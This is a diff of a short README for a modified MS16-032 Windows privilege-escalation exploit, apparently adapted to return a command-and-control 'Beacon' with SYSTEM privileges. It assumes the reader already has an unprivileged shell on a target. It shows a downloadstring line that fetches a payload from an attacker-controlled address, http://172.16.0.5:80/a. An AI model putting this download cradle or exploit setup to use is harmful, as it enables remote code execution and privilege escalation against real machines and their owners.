@@ -1,9 +1,8 @@
 # Updated Exploit ms16-032 to get a Beacon back
 
-## Requirement
-You need a unpriviledged Shell/Beacon on Target and have to change the exploit to fit your currnet ListenerName 
+You need a unpriviledged Shell/Beacon on the target. Don't forget to change the exploit for your correct ListenerName 
 ```
-downloadstring('http://172.16.0.5:80/a'))
+... downloadstring('http://172.16.0.5:80/a')) ...
 ```
 ## Get a Beacon with System Priviledges
 ```
